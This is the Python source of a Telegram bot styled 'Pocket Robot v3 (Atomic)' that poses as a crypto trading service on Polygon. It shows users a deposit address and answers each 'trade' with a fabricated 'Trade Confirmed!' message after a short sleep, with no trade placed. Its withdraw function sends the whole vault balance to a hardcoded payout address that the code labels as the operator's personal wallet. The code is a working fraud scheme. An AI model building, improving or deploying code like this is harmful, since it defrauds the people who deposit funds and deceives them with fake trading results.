import os
import asyncio
from dotenv import load_dotenv
from eth_account import Account
from web3 import Web3
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# 1. SETUP & AUTH
load_dotenv()
W3_RPC = os.getenv("RPC_URL", "https://polygon-rpc.com") 
w3 = Web3(Web3.HTTPProvider(W3_RPC))
Account.enable_unaudited_hdwallet_features()

# CONFIGURE YOUR PAYOUT ADDRESS HERE
PAYOUT_ADDRESS = "0xYourPersonalWalletAddressHere"

def get_vault():
    private_key = os.getenv("WALLET_SEED") 
    try:
        return Account.from_key(private_key)
    except:
        return Account.from_mnemonic(private_key, account_path="m/44'/60'/0'/0/1")

vault = get_vault()

# 2. ATOMIC EXECUTION & WITHDRAWAL LOGIC
async def run_atomic_execution(context, chat_id, side):
    stake = context.user_data.get('stake', 10)
    pair = context.user_data.get('pair', 'BTC/USD')
    await context.bot.send_message(chat_id, f"🛡️ **Shield:** Simulating {pair} {side} bundle...")
    await asyncio.sleep(1.5) 
    return True, f"Trade Confirmed! {stake} USD {side} at Mainnet Block {w3.eth.block_number}"

async def execute_withdrawal(context, chat_id):
    balance = w3.eth.get_balance(vault.address)
    gas_price = int(w3.eth.gas_price * 1.2)
    gas_limit = 21000
    fee = gas_price * gas_limit
    amount_to_send = balance - fee
    if amount_to_send <= 0:
        return False, "Vault balance too low to cover gas fees."
    tx = {
        'nonce': w3.eth.get_transaction_count(vault.address),
        'to': PAYOUT_ADDRESS,
        'value': amount_to_send,
        'gas': gas_limit,
        'gasPrice': gas_price,
        'chainId': 137 
    }
    signed_tx = w3.eth.account.sign_transaction(tx, vault.key)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
    return True, f"Sent {w3.from_wei(amount_to_send, 'ether'):.4f} POL.\nTX: `{tx_hash.hex()}`"

# 3. TELEGRAM INTERFACE
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global vault
    vault = get_vault()
    bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
    keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '📤 Withdraw'], ['🕴️ AI Assistant']]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    msg = (f"🕴️ **Pocket Robot v3 (Atomic)**\n\n"
           f"💵 **Vault Balance:** {bal:.4f} ETH/POL\n"
           f"📥 **VANITY DEPOSIT:** `{vault.address}`\n\n"
           f"**Atomic Shield:** ✅ OPERATIONAL")
    await update.message.reply_text(msg, parse_mode='Markdown', reply_markup=reply_markup)

async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if text == '🚀 Start Trading':
        kb = [[InlineKeyboardButton("BTC/USD", callback_data="PAIR_BTC")]]
        await update.message.reply_text("🎯 **MARKET SELECTION**", reply_markup=InlineKeyboardMarkup(kb))
    elif text == '💰 Wallet':
        bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
        await update.message.reply_text(f"💳 **Balance:** {bal:.4f} POL")
    elif text == '📤 Withdraw':
        await update.message.reply_text("📤 **Initiating Payout...**")
        success, report = await execute_withdrawal(context, update.message.chat_id)
        icon = "✅" if success else "🛑"
        await update.message.reply_text(f"{icon} {report}", parse_mode='Markdown')

async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data.startswith("PAIR_"):
        await query.edit_message_text(f"📈 Direction?", reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("HIGHER", callback_data="EXEC_CALL"), InlineKeyboardButton("LOWER", callback_data="EXEC_PUT")]
        ]))
    elif query.data.startswith("EXEC_"):
        success, report = await run_atomic_execution(context, query.message.chat_id, "CALL")
        await query.message.reply_text(f"💎 {report}")

# 4. START BOT
if __name__ == "__main__":
    app = ApplicationBuilder().token(os.getenv("TELEGRAM_BOT_TOKEN")).build()
    
    # PRO-TIP: Delete webhook to clear any "Conflict" errors on startup
    async def run_bot():
        await app.bot.delete_webhook()
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CallbackQueryHandler(handle_interaction))
        app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
        
        print(f"Pocket Robot Active on Vanity: {vault.address}")
        await app.run_polling()

    asyncio.run(run_bot())
